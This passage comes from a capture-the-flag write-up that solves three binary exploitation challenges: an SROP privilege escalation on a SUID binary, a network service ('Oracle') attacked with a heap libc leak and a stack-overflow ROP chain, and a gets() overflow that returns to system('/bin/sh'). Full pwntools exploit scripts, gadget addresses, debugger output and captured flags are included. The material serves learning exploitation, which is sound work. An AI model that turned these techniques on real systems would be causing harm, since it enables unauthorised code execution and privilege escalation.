mov     ecx, offset prompt ; "Where to go, challenger? your fractured"...
mov     edx, 4Ah ; 'J'  ; len
int     80h             ; LINUX - sys_write
call    _vuln
mov     eax, 1
xor     ebx, ebx        ; status
int     80h             ; LINUX - sys_exit
_start endp

_text ends
------------------------------------
_vuln proc near

addr= byte ptr -20h

mov     eax, 3
xor     ebx, ebx        ; fd
lea     ecx, [esp+addr] ; addr
mov     edx, 200h       ; len
int     80h             ; LINUX - sys_read
xor     eax, eax
retn
_vuln endp

```


Reviewing the assembly of `target`, there’s a clear buffer overflow in the `_vuln` function. However, the binary is small, limiting our exploitation options.


Examining the `init` script reveals that ASLR is disabled, and `flag.txt` is located in the `/root` folder. Additionally, the `target` binary’s SUID bit is set.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
#!/bin/sh

export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

chown -R root:root /
chmod 0700 /root

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devpts -o gid=5,mode=0620 devpts /dev/pts
mount -t devtmpfs -o nosuid,mode=0755 udev /dev

chmod 0400 /root/flag.txt
chmod u+s /target

hostname arena
echo 0 >/proc/sys/kernel/randomize_va_space

setsid cttyhack setuidgid 1000 /bin/sh

umount /proc && umount /sys
poweroff -d 0 -f

```


Now that we’ve checked the `target` binary and the `init` script, let’s try to think on how to exploit this.


### Solution


To simplify the exploitation process, we first modify the `init` script for root access by changing `setuidgid 1000` to `setuidgid 0`, then repack it. Here’s how my modified `run.sh` looks, automatically repacking the filesystem before starting `qemu`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
#!/bin/sh
rm -rf debugfs.cpio
cd tmp-root; find . -print0 | cpio -o --null --format=newc --owner=root > ../debugfs.cpio
cd ../
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel "./vmlinuz-linux" \
    -append "console=ttyS0 quiet loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -monitor /dev/null \
    -initrd "./debugfs.cpio" \
    -cpu qemu64,+smep,+smap,+rdrand \
    -smp cores=2 \
	-gdb tcp::12345

```


After running the `binary` in qemu and inspecting its memory mapping, we observe a static `vdso` area.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
root@arena:/# ./target &
root@arena:/# Where to go, challenger? your fractured reflection is your only guide.
> ps aux | grep target
   73 root      0:00 ./target
   75 root      0:00 grep target
[1]+  Stopped (tty input)        ./target
root@arena:/# cat /proc/73/maps
08048000-08049000 r--p 00000000 00:02 5                                  /target
08049000-0804a000 r-xp 00001000 00:02 5                                  /target
0804a000-0804b000 rw-p 00002000 00:02 5                                  /target
f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

```


I manually dumped the `vdso` with the below command to identify usable gadgets.


```
1

```


```
dd if=/proc/73/mem bs=1 skip=$((0xf7ffc000)) count=8192 2>/dev/null | od -v -t x8

```


The above will dump the `vdso` bytes. I parsed the output with the below script to convert it to a valid `vdso.so` binary.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
from pwn import *

lines = open('vdso_dump', 'rb').readlines()

data = b''
for line in lines:
    a, b = line.strip().split(b' ')[1:]
    data += p64(int(a.decode(), 16)) + p64(int(b.decode(), 16))

with open ('vdso.so', 'wb') as f:
    f.write(data)
    f.close()

```


Now we have the `vdso_dump`, let’s check for good gadgets on it. One particular gadget found in the `vdso_dump`, `0x00000591: mov eax, 0x77; int 0x80;`.


Taking a look at the syscall table, this is actually a `SIGRETURN` syscall, which mean we can do `SROP`. `pwntools` has a good helper that can help us easily setup the `SigreturnFrame`, which mean this will be enough for us to do a basic ROP of:


- `setuid(0)`


- We need to do this because `/root/flag.txt` is owned by `root`, which is kinda a privilege escalation challenge via SUID.


- `execve('/bin/cat', '/root/flag.txt')`


- This will read the flag


However, I encountered several challenges during exploitation. The first issue relates to qemu interpreting specific bytes as commands rather than binary input. To circumvent this, we escape all characters with `\x16` (e.g., to send `aaa`, it’s encoded as `\x16a\x16a\x16a`), and utilize `\x04` to flush input instead of using a newline.


Secondly, the `sigreturn` syscall consistently failed in qemu. Upon observing via `gdb`, it is due to the stack pointer being too close to the stack’s end. To resolve this, I used another `vdso` gadget, `0x00000b7c: pop ebp; cld; leave; ret;`, for stack pivoting, effectively moving the stack pointer away from the end.


This approach facilitated a successful SROP execution. Below is the exploit script with detailed comments:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68

```


```
from pwn import *

exe = ELF('./target')
context.arch = 'i386'
context.kernel = 'amd64'

# Gadgets
int80_call_vuln = 0x8049029
vdso_base         = 0xf7ffc000
sigreturn         = vdso_base+0x591
pop_ebp_leave_ret = vdso_base+0x00000b7c

# Connection
# r = process('./run.sh')
r = remote('83.136.251.145', 57764)

# Run target
pause()
r.sendlineafter(b'$ ', b'./target')

# Reduce stack so that sigreturn will work
info(f'Reduce stack to make sigreturn successful')
curr_esp = 0xffffde4c # Retrieved from gdb (remember no ASLR)
for i in range(13):
    # Return to _start.
    payload = (b'\x16\x15\x90\x16\x04\x08')*8
    payload += p32(pop_ebp_leave_ret)
    payload += p32(curr_esp) # This will make on iteration, the program pivot to address near our payload (which will make the program return to _start)
    info(f'Curr iteration: {i}...')
    sleep(0.5)
    r.send(payload+b'\x04')
    curr_esp -= 0x1c

# Sigreturn to do setuid(0)
info(f'SROP to do suid(0)')
esp = 0xffffcf50
frame = SigreturnFrame()
frame.eax = 0x17
frame.ebx = 0x0
frame.esp = esp
frame.eip = int80_call_vuln # After sigreturn, we will return back to _vuln
payload = b'a'*0x20
payload += p32(sigreturn)
frame_escaped = b''
for ch in bytes(frame):
    frame_escaped += bytes([0x16, ch])
payload += frame_escaped
r.send(payload+b'\x04')

# Sigreturn to do /bin/cat /root/flag.txt
info(f'SROP to do /bin/cat /root/flag.txt')
frame = SigreturnFrame()
frame.eax = 0xb
frame.ebx = esp+0x50
frame.ecx = esp-0x24
frame.esp = esp
frame.eip = int80_call_vuln # int80; call _vuln
payload = p32(esp+0x50)+p32(esp+0x58+0x4)+p32(0)*2+b'a'*0x10 # Setup for /bin/cat args
payload += p32(sigreturn)
frame_escaped = b''
for ch in bytes(frame):
    frame_escaped += bytes([0x16, ch])
payload += frame_escaped
payload += b'/bin/cat' + p32(0)
payload += b'/root/flag.txt\x00\x00'
r.send(payload+b'\x04')

r.interactive()

```


Executing the above script will give us the flag


>


**Flag: HTB{Sm4sh1nG_Th3_V01d_F0r_Fun_4nd_Pr0f1t}


## Oracle [hard]


            *Description*


            Traversing through the desert, you come across an Oracle. One of five in the entire arena, an oracle gives you the power to watch over the other competitors and send infinitely customizable plagues upon them. Deeming their powers to be too strong, the sadistic overlords that run the contest decided long ago that every oracle can backfire - and, if it does, you will wish a thousand times over that you had never been born. Willing to do whatever it takes, you break it open, risking eternal damnation for a chance to turn the tides in your favour.


### Initial Analysis


In this challenge, we were given the source code.


**oracle.c


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249

```


```
// gcc oracle.c -o oracle -fno-stack-protector

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT                    9001
#define MAX_START_LINE_SIZE     1024
#define MAX_PLAGUE_CONTENT_SIZE 2048
#define MAX_HEADER_DATA_SIZE    1024
#define MAX_HEADERS             8
#define MAX_HEADER_LENGTH       128

#define VIEW                    "VIEW"
#define PLAGUE                  "PLAGUE"
#define BAD_REQUEST             "400 Bad Request - you can only view competitors or plague them. What else would you want to do?\n"
#define PLAGUING_YOURSELF       "You tried to plague yourself. You cannot take the easy way out.\n"
#define PLAGUING_OVERLORD       "You have committed the greatest of sins. Eternal damnation awaits.\n"
#define NO_COMPETITOR           "No such competitor %s exists. They may have fallen before you tried to plague them. Attempted plague: "
#define CONTENT_LENGTH_NEEDED   "You need to specify the length of your plague description. How else can I help you?\n"
#define RANDOMISING_TARGET      "Randomising a target competitor, as you wish...\n"

struct PlagueHeader {
    char key[MAX_HEADER_LENGTH];
    char value[MAX_HEADER_LENGTH];
};

struct PlagueHeader headers[MAX_HEADERS];

int client_socket;

char action[8];
char target_competitor[32];
char version[16];

void handle_request();
void handle_view();
void handle_plague();
void parse_headers();
char *get_header();
int is_competitor();


int main() {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (server_socket == -1) {
        perror("Failed to create socket!");
        exit(EXIT_FAILURE);
    }

    // Set up the server address struct
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(PORT);

    // Bind the socket to the specified address and port
    if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
        perror("Socket binding failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_socket, 5) == -1) {
        perror("Socket listening failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("Oracle listening on port %d\n", PORT);

    while(1) {
        client_socket = accept(server_socket, NULL, NULL);

        puts("Received a spiritual connection...");

        if (client_socket == -1) {
            perror("Socket accept failed");
            continue;
        }

        handle_request();
    }

    return 0;
}

void handle_request() {
    // take in the start-line of the request
    // contains the action, the target competitor and the oracle version
    char start_line[MAX_START_LINE_SIZE];

    char byteRead;
    ssize_t i = 0;

    for (ssize_t i = 0; i < MAX_START_LINE_SIZE; i++) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        if (start_line[i-1] == '\r' && byteRead == '\n') {
            start_line[i-1] == '\0';
            break;
        }

        start_line[i] = byteRead;
    }

    sscanf(start_line, "%7s %31s %15s", action, target_competitor, version);
    parse_headers();

    // handle the specific action desired
    if (!strcmp(action, VIEW)) {
        handle_view();
    } else if (!strcmp(action, PLAGUE)) {
        handle_plague();
    } else {
        perror("ERROR: Undefined action!");
        write(client_socket, BAD_REQUEST, strlen(BAD_REQUEST));
    }

    // clear all request-specific values for next request
    memset(action, 0, 8);
    memset(target_competitor, 0, 32);
    memset(version, 0, 16);
    memset(headers, 0, sizeof(headers));
}

void handle_view() {
    if (!strcmp(target_competitor, "me")) {
        write(client_socket, "You have found yourself.\n", 25);
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, "No such competitor exists.\n", 27);
    } else {
        write(client_socket, "It has been imprinted upon your mind.\n", 38);
    }
}

void handle_plague() {
    if(!get_header("Content-Length")) {
        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
        return;
    }

    // take in the data
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    char *plague_target = (char *)0x0;

    if (get_header("Plague-Target")) {
        plague_target = (char *)malloc(0x40);
        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
    } else {
        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
    }

    long len = strtoul(get_header("Content-Length"), NULL, 10);

    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);

    if(!strcmp(target_competitor, "me")) {
        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
    } else {
        dprintf(client_socket, NO_COMPETITOR, target_competitor);

        if (len) {
            write(client_socket, plague_content, len);
            write(client_socket, "\n", 1);
        }
    }

    free(plague_content);

    if (plague_target) {
        free(plague_target);
    }
}

void parse_headers() {
    // first input all of the header fields
    ssize_t i = 0;
    char byteRead;
    char header_buffer[MAX_HEADER_DATA_SIZE];

    // BUFFER OVERFLOW
    while (1) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        // clean up the headers by removing extraneous newlines
        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
            header_buffer[i] = byteRead;

        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
            header_buffer[i-4] == '\0';
            break;
        }

        i++;
    }

    // now parse the headers
    const char *delim = "\r\n";
    char *line = strtok(header_buffer, delim);

    ssize_t num_headers = 0;

    while (line != NULL && num_headers < MAX_HEADERS) {
        char *colon = strchr(line, ':');

        if (colon != NULL) {
            *colon = '\0';

            strncpy(headers[num_headers].key, line, MAX_HEADER_LENGTH);
            strncpy(headers[num_headers].value, colon+2, MAX_HEADER_LENGTH);        // colon+2 to remove whitespace

            num_headers++;
        }

        line = strtok(NULL, delim);
    }
}

char *get_header(char *header_name) {
    // return the value for a specific header key
    for (ssize_t i = 0; i < MAX_HEADERS; i++) {
        if(!strcmp(headers[i].key, header_name)) {
            return headers[i].value;
        }
    }

    return NULL;
}

int is_competitor(char *name) {
    // don't want the user of the Oracle to be able to plague Overlords!
    if (!strncmp(name, "Overlord", 8))
        return 0;

    return 1;
}

```


To summarize what this code do, when we execute this program, it creates a new socket connection that we can connect to. The `handle_request` function is key, as it processes our inputs to the socket and determines the next steps based on what it receives.


There are two primary actions possible: `VIEW` and `PLAGUE`. Instead of explaining the entire code, I’ll focus directly on parts where issues are found, starting with the `parse_headers` function.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42

```


```
void parse_headers() {
    // first input all of the header fields
    ssize_t i = 0;
    char byteRead;
    char header_buffer[MAX_HEADER_DATA_SIZE];

    while (1) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        // clean up the headers by removing extraneous newlines
        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
            header_buffer[i] = byteRead;

        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
            header_buffer[i-4] == '\0';
            break;
        }

        i++;
    }

    // now parse the headers
    const char *delim = "\r\n";
    char *line = strtok(header_buffer, delim);

    ssize_t num_headers = 0;

    while (line != NULL && num_headers < MAX_HEADERS) {
        char *colon = strchr(line, ':');

        if (colon != NULL) {
            *colon = '\0';

            strncpy(headers[num_headers].key, line, MAX_HEADER_LENGTH);
            strncpy(headers[num_headers].value, colon+2, MAX_HEADER_LENGTH);        // colon+2 to remove whitespace

            num_headers++;
        }

        line = strtok(NULL, delim);
    }
}

```


It’s noticed that this function has a buffer overflow problem. No matter if our inputs are correct or not, as long as the input doesn’t end with `\r\n\r\n`, it will continue to add to the `i` count. This means we can input data much more than the `MAX_HEADER_DATA_SIZE` allows.


Yet, without any way to leak information, this buffer overflow isn’t immediately useful. Exploring further, another function caught my attention for potential exploitation. Let’s look at the `handle_plague` function.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44

```


```
void handle_plague() {
    if(!get_header("Content-Length")) {
        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
        return;
    }

    // take in the data
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    char *plague_target = (char *)0x0;

    if (get_header("Plague-Target")) {
        plague_target = (char *)malloc(0x40);
        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
    } else {
        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
    }

    long len = strtoul(get_header("Content-Length"), NULL, 10);

    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);

    if(!strcmp(target_competitor, "me")) {
        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
    } else {
        dprintf(client_socket, NO_COMPETITOR, target_competitor);

        if (len) {
            write(client_socket, plague_content, len);
            write(client_socket, "\n", 1);
        }
    }

    free(plague_content);

    if (plague_target) {
        free(plague_target);
    }
}

```


Notice that the `MAX_PLAGUE_CONTENT_SIZE` is set to `2048`, which means if this chunk is freed, it goes into the `unsortedbin`, and the chunk’s data will include a `libc` address. The issue here is the function doesn’t clear the chunk’s content before reusing it.


For instance, if we invoke `handle_plague()` twice, and on the second call, we only send 1 byte of data for the `plague_content` chunk, we end up only overwriting the least significant byte. The rest of the bytes will retain a `libc` address from the `unsortedbin`, making the `plague_content` contains a `libc` leak if we trigger the `else` condition during the `target_competitor` comparison.


With this two bug, we can move to the next step, which is crafting our solution.


### Solution


To begin, we’ll set up our helper functions. It’s important to remember that we’re interacting with a socket created by the program, not the program directly. This means if we make multiple connections to it, the ASLR addresses remain unchanged as long as the program isn’t restarted.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52

```


```
from pwn import *

exe = ELF("oracle_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = '94.237.63.128'
remote_port = 59852
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def make_request(act, target, version):
    payload = act + b' ' + target + b' ' + version + b'\r\n'
    so(payload)

def make_headers(headers):
    payload = b''
    for key, val in headers.items():
        payload += (key+b': '+val+b'\r\n')
    payload += b'\r\n'
    so(payload)

def make_raw_headers(payload):
    so(payload+b'\r\n'*2)

```


Our first step is to obtain a `libc` leak. We can achieve this by making a `PLAGUE` request twice, following the strategy I outlined earlier.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25

```


```
# Trigger unsorted bin free
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
pause()
old_r = r

# Get libc leak
r = conn()
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
r.recvuntil(b'plague: ')
libc.address = u64(r.recv(8)) - 0x1ecb61
logleak('libc.address', libc.address)
pause()
old_r = r

```


With the `libc` leak in hand, we can now proceed to craft our ROP chain to read the flag by abusing the buffer-overflow bug in the `parse_headers` function. The ROP chain I’ve designed follows a basic `open-read-write` pattern, ultimately writing the flag to our socket descriptor. I added an extra `read` step to the chain to read `flag.txt` into a chosen address in the `libc` writable area.


Here is the complete code for the exploit.


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111

```


```
from pwn import *

exe = ELF("oracle_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = '94.237.63.128'
remote_port = 59852
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def make_request(act, target, version):
    payload = act + b' ' + target + b' ' + version + b'\r\n'
    so(payload)

def make_headers(headers):
    payload = b''
    for key, val in headers.items():
        payload += (key+b': '+val+b'\r\n')
    payload += b'\r\n'
    so(payload)

def make_raw_headers(payload):
    so(payload+b'\r\n'*2)

# Trigger unsorted bin free
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
pause()
old_r = r

# Get libc leak
r = conn()
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
r.recvuntil(b'plague: ')
libc.address = u64(r.recv(8)) - 0x1ecb61
logleak('libc.address', libc.address)
pause()
old_r = r

r = conn()
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
info(f'Make request...')
pause()
flag_str = libc.address+0x1edfe0
rop = ROP(libc)

# read flag.txt
rop(rax=0x0, rdi=0x6, rsi=flag_str, rdx=8)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# open
rop(rax=0x2, rdi=flag_str, rsi=0, rdx=0)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# read
xchg_edi_eax = libc.address+0x0014f671
rop.raw(xchg_edi_eax)
rop(rax=0x0, rsi=flag_str, rdx=0x30)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# write
rop(rax=0x1, rdi=0x6, rsi=flag_str, rdx=0x30)
rop.raw(rop.find_gadget(['syscall', 'ret']))
payload = b'\n'*0x430
payload += p64(0)
payload += rop.chain()
make_raw_headers(payload)
logleak('flag_str', flag_str)
pause()
r.send(b'flag.txt')
r.interactive()

```


Executing the above code, we will receive the `flag.txt` content from the socket.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
╰─❯ python solve.py
[+] Opening connection to 94.237.63.128 on port 59852: Done
[*] Paused (press any to continue)
[+] Opening connection to 94.237.63.128 on port 59852: Done
[*] libc.address = 0x7fe620166000
[*] Paused (press any to continue)
[+] Opening connection to 94.237.63.128 on port 59852: Done
[*] Make request...
[*] Paused (press any to continue)
[*] Loading gadgets for '/home/chovid99/ctf-journey/2024/cyber-apocalypse/pwn/oracle/pwn_oracle/challenge/libc-2.31.so'
[*] flag_str = 0x7fe620353fe0
[*] Paused (press any to continue)
[*] Switching to interactive mode
HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}
\x00\x00\x00

```


>


**Flag: HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}


## Sound of Silence


            *Description*


            Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!


### Initial Analysis


In this challenge, we were given a binary called `sound_of_silence`. Let’s try to disassemble the binary.


```
1
2
3
4
5
6
7

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  system("clear && echo -n '~The Sound of Silence is mesmerising~\n\n>> '");
  return gets(v4, argv);
}

```


As we can see, this challenge involves another buffer overflow vulnerability. Let’s examine the binary’s mitigations:


```
1
2
3
4
5
6

```


```
╰─❯ checksec sound_of_silence
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


We can see that it is a `No PIE` binary, which means we don’t need an address leak to exploit it. Let’s move on to crafting the solution.


### Solution


First, we examine the disassembled code of the `main` function.
**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 20h
lea     rax, command    ; "clear && echo -n '~The Sound of Silence"...
mov     rdi, rax        ; command
call    _system
lea     rax, [rbp+var_20]
mov     rdi, rax
mov     eax, 0
call    _gets
nop
leave
retn

```


We notice an instruction `mov rdi, rax; call _system`. Next, we observe the register values in `gdb` just before our program executes the `ret` instruction.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36

```


```
Breakpoint 1, 0x0000000000401184 in main ()
[ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- registers ----
$rax   : 0x00007fffffffd6d0  ->  0x0068732f6e69622f ('/bin/sh'?)
$rbx   : 0x0000000000000000
$rcx   : 0x00007ffff7e1aaa0 <_IO_2_1_stdin_>  ->  0x00000000fbad2088
$rdx   : 0x0000000000000001
$rsp   : 0x00007fffffffd6f8  ->  0x0000000000401184 <main+0x2e>  ->  0xfa1e0ff3000000c3
$rbp   : 0x0000000000404060  ->  0x0000000000000000
$rsi   : 0x0000000000000001
$rdi   : 0x00007ffff7e1ca80 <_IO_stdfile_0_lock>  ->  0x0000000000000000
$rip   : 0x0000000000401184 <main+0x2e>  ->  0xfa1e0ff3000000c3
$r8    : 0x0000000000000000
$r9    : 0x0000000000000000
$r10   : 0x0000000000000077
$r11   : 0x0000000000000246
$r12   : 0x00007fffffffd808  ->  0x00007fffffffdc44  ->  './sound_of_silence'
$r13   : 0x0000000000401156 <main>  ->  0xe5894855fa1e0ff3
$r14   : 0x0000000000403dd0 <__do_global_dtors_aux_fini_array_entry>  ->  0x0000000000401120 <__do_global_dtors_aux>  ->  0x2ee53d80fa1e0ff3
$r15   : 0x00007ffff7ffd040 <_rtld_global>  ->  0x00007ffff7ffe2e0  ->  0x0000000000000000
$eflags: 0x202 [ident align vx86 resume nested overflow direction INTERRUPT trap sign zero adjust parity carry] [Ring=3]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- stack ----
0x7fffffffd6f8|+0x0000|+000: 0x0000000000401184 <main+0x2e>  ->  0xfa1e0ff3000000c3  <-  retaddr[0], $rsp
0x7fffffffd700|+0x0008|+001: 0x0000000000401184 <main+0x2e>  ->  0xfa1e0ff3000000c3  <-  retaddr[0]
0x7fffffffd708|+0x0010|+002: 0x0000000000401169 <main+0x13>  ->  0xfffffedfe8c78948
0x7fffffffd710|+0x0018|+003: 0x00000001ffffd700
0x7fffffffd718|+0x0020|+004: 0x00007fffffffd808  ->  0x00007fffffffdc44  ->  './sound_of_silence'
0x7fffffffd720|+0x0028|+005: 0x0000000000000000
0x7fffffffd728|+0x0030|+006: 0x26d6647c66e4aac2
0x7fffffffd730|+0x0038|+007: 0x00007fffffffd808  ->  0x00007fffffffdc44  ->  './sound_of_silence'
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- code:x86:64 ----
    0x40117d e8defeffff         <main+0x27>   call   0x401060 <gets@plt>
    0x401182 90                 <main+0x2c>   nop
    0x401183 c9                 <main+0x2d>   leave
 -> 0x401184 c3                 <main+0x2e>   ret

```


It appears that `rax` is pointing to the address of our input. This means that if we start our payload with `/bin/sh\x00`, and use the buffer overflow vulnerability to overwrite the return address with the address of the instruction `mov rdi, rax; call _system`, then `rdi` will point to the string `/bin/sh\x00`, allowing us to easily get a shell without needing any `libc` leak.


Below is the full script I used to solve this challenge:


```
 1
 2
 3
 4
 5
 6
 7
 8
